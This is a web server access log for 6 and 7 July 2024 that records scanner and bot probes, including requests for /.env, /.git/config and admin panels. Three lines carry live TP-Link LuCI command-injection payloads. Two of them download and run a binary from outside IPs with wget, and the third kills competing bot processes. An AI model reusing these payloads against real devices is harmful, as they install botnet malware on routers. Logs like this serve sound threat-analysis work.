185.150.26.246 - - [06/Jul/2024:09:27:01 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
57.129.23.166 - - [06/Jul/2024:10:03:47 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [06/Jul/2024:10:03:47 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.227.254.8 - - [06/Jul/2024:10:10:05 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
172.105.128.13 - - [06/Jul/2024:10:11:50 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x94.\x0F? 5\x02\xAB7\x17'\x9A\xE5\xD4\x1F\xA9\x0B\x1DemZ6y\xD8\xC1\xE1\x8C\xEC\x1D\x1F\xAC\xD2\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
87.246.7.54 - - [06/Jul/2024:10:27:32 +0000] "GET / HTTP/1.0" 404 150 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
157.230.45.135 - - [06/Jul/2024:10:35:01 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
157.230.45.135 - - [06/Jul/2024:10:35:49 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\x1D\x8DR\xEB\xD864\x5C\xB1|.8\xAA8D\xC2\x08\xD6z\xED\x9Cf\x17i\xC3\xB2\xE3;\xD8KNV L\xF5\xEE/]\x8EQc\x06\xC3`\xBFcZ\xA1\x05Y\x8C\x04\xE2\x82\xBB.X\x7F\xA6\xCDN\xF2\xC5fw\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
94.156.68.162 - - [06/Jul/2024:10:39:28 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G973F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
185.224.128.43 - - [06/Jul/2024:10:43:51 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [06/Jul/2024:11:10:39 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [06/Jul/2024:11:10:40 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [06/Jul/2024:11:38:31 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [06/Jul/2024:11:53:27 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
84.54.51.37 - - [06/Jul/2024:12:10:42 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink80%3B+rm+-rf+r%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [06/Jul/2024:12:18:59 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [06/Jul/2024:12:24:17 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.174.191.31 - - [06/Jul/2024:12:36:06 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
41.90.69.220 - - [06/Jul/2024:12:51:34 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
141.98.83.197 - - [06/Jul/2024:13:23:32 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [06/Jul/2024:13:37:43 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.202 - - [06/Jul/2024:13:37:55 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [06/Jul/2024:13:58:03 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:13:58:03 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.169.3.38 - - [06/Jul/2024:14:01:57 +0000] "GET /manager/html HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
45.79.128.205 - - [06/Jul/2024:14:02:14 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xFEB%\x96\xB92\xDD\xE1" 400 154 "-" "-"
107.151.182.54 - - [06/Jul/2024:14:44:30 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:44:49 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:44:49 +0000] "GET /WebInterface/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:45:11 +0000] "GET /identity HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:45:34 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:45:52 +0000] "GET /index.jsp HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:11 +0000] "GET /admin/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:11 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:11 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:11 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:25 +0000] "GET /api/session/properties HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:39 +0000] "GET /showLogin.cc HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:48 +0000] "GET /favicon-32x32.png HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:48 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:48 +0000] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:57 +0000] "GET /js/NewWindow_2_all.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:46:57 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:47:09 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:47:09 +0000] "GET /zabbix/favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:47:14 +0000] "GET /sugar_version.json HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.54 - - [06/Jul/2024:14:47:20 +0000] "GET /solr/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
141.98.83.197 - - [06/Jul/2024:14:48:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
44.236.133.133 - - [06/Jul/2024:14:56:50 +0000] "\x00\x00\x00P\x00\x03\x00\x00user\x00nuclei\x00database\x00nuclei\x00application_name\x00psql\x00client_encoding\x00UTF8\x00\x00p\x00\x00\x006SCRAM-SHA-256\x00\x00\x00\x00 n,,n=,r=\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 154 "-" "-"
44.236.133.133 - - [06/Jul/2024:14:56:50 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
44.236.133.133 - - [06/Jul/2024:14:56:50 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
44.236.133.133 - - [06/Jul/2024:14:56:52 +0000] "GET /version HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/605.1.33 (KHTML, like Gecko) Version/9.1.2 Safari/605.1.33"
54.191.198.58 - - [06/Jul/2024:15:16:00 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
44.236.133.133 - - [06/Jul/2024:15:16:00 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
172.206.143.39 - - [06/Jul/2024:15:20:31 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
83.147.52.37 - - [06/Jul/2024:15:38:02 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
185.224.128.43 - - [06/Jul/2024:15:40:16 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [06/Jul/2024:15:43:00 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.150.26.251 - - [06/Jul/2024:15:44:04 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
45.148.10.251 - - [06/Jul/2024:16:03:25 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [06/Jul/2024:16:09:16 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:16:09:16 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [06/Jul/2024:16:38:50 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.68.162 - - [06/Jul/2024:16:45:54 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1"
66.175.213.4 - - [06/Jul/2024:16:47:40 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x9F\xC7\xB4\x91\x0Eiz\x012\xAB\xE3\xEF\xDFh\x0E\xCDlZ\x86D\xFE\x07\x03\xEEsPQ^sa\xE16\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
45.148.10.251 - - [06/Jul/2024:17:14:49 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [06/Jul/2024:17:18:00 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:17:18:00 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.148.10.251 - - [06/Jul/2024:17:29:01 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.174 - - [06/Jul/2024:17:29:47 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [06/Jul/2024:17:38:43 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.172.21 - - [06/Jul/2024:18:01:36 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03I\x99C\x1Bbao\xB0g\x8Bd\xAF7\xD2\x16\x07\x1D\x9FN#\x8C^R\xDA\xC5\x15p1B\xAF\xE78\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
78.153.140.177 - - [06/Jul/2024:18:25:09 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [06/Jul/2024:18:25:09 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x86\x8C\xC7\xD2\xC0\x05\xE2\xBD\xF7m\x95\xD9\x93\xC5\xF37\xE3y\xB8P9\x07<\xB6\x15\xE5\x0C\xD4(\xD5\xC2\x13 \x90\xA4\xF4=>\x0E\x12\x06jGa\xBEq\x1F\x0FF\x84Zw\xCB\x22\xEC%wK\x15\xA8[\xD4\x9EP6\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 154 "-" "-"
167.94.138.41 - - [06/Jul/2024:19:19:22 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
167.94.138.41 - - [06/Jul/2024:19:19:34 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.41 - - [06/Jul/2024:19:19:38 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
167.94.138.120 - - [06/Jul/2024:19:26:35 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
167.94.138.120 - - [06/Jul/2024:19:26:44 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.120 - - [06/Jul/2024:19:26:45 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
92.249.48.202 - - [06/Jul/2024:19:35:54 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [06/Jul/2024:19:43:47 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:19:43:48 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:19:53:18 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:19:53:18 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [06/Jul/2024:20:01:05 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [06/Jul/2024:20:01:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
87.121.69.61 - - [06/Jul/2024:20:35:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 122 "http://20.120.210.192:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
87.121.69.61 - - [06/Jul/2024:20:35:50 +0000] "" 400 0 "-" "-"
39.185.100.232 - - [06/Jul/2024:20:36:23 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 150 "-" "-"
172.18.0.1 - - [06/Jul/2024:20:56:05 +0000] "GET / HTTP/1.1" 200 1521 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [06/Jul/2024:20:56:05 +0000] "GET /welcome-bckgrnd.jpg HTTP/1.1" 200 1521 "http://localhost:52776/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [06/Jul/2024:20:56:05 +0000] "GET /images/favicon-16x16.png HTTP/1.1" 200 1521 "http://localhost:52776/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
185.244.36.159 - - [06/Jul/2024:21:17:38 +0000] "GET / HTTP/1.1" 200 4883 "-" "-"
141.98.83.197 - - [06/Jul/2024:21:21:29 +0000] "GET / HTTP/1.1" 200 1521 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [06/Jul/2024:21:26:06 +0000] "GET / HTTP/1.1" 200 1521 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
147.185.133.73 - - [06/Jul/2024:22:56:13 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.191.126.213 - - [06/Jul/2024:23:34:27 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
54.37.79.75 - - [06/Jul/2024:23:36:20 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [06/Jul/2024:23:36:20 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.3 - - [06/Jul/2024:23:49:10 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
94.156.68.162 - - [07/Jul/2024:00:20:51 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1"
172.104.11.34 - - [07/Jul/2024:00:23:18 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03f\xD9\xC6\x01\xBB\xE4 W\x0C\xCB\xA34\xA42\xFD\xCB\xD2~2\xAE\x08\x9E/\x97\xF6'\xD8\xA4\x11\xC3\xBF\xBD\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
20.115.210.94 - - [07/Jul/2024:00:24:34 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
76.147.138.124 - - [07/Jul/2024:00:25:09 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.120.210.192 - - [07/Jul/2024:00:25:15 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.115.210.94 - - [07/Jul/2024:00:25:23 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
54.37.79.75 - - [07/Jul/2024:00:28:19 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:00:28:19 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:00:28:37 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
88.214.25.65 - - [07/Jul/2024:00:29:00 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
91.92.247.56 - - [07/Jul/2024:00:44:26 +0000] "GET /api/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
47.252.30.35 - - [07/Jul/2024:00:50:16 +0000] "test" 400 154 "-" "-"
47.252.30.35 - - [07/Jul/2024:00:50:23 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
198.235.24.41 - - [07/Jul/2024:00:50:45 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
47.252.30.35 - - [07/Jul/2024:00:52:37 +0000] "test" 400 154 "-" "-"
47.90.178.241 - - [07/Jul/2024:00:56:12 +0000] "test" 400 154 "-" "-"
92.249.48.202 - - [07/Jul/2024:01:01:28 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
47.90.217.179 - - [07/Jul/2024:01:05:09 +0000] "test" 400 154 "-" "-"
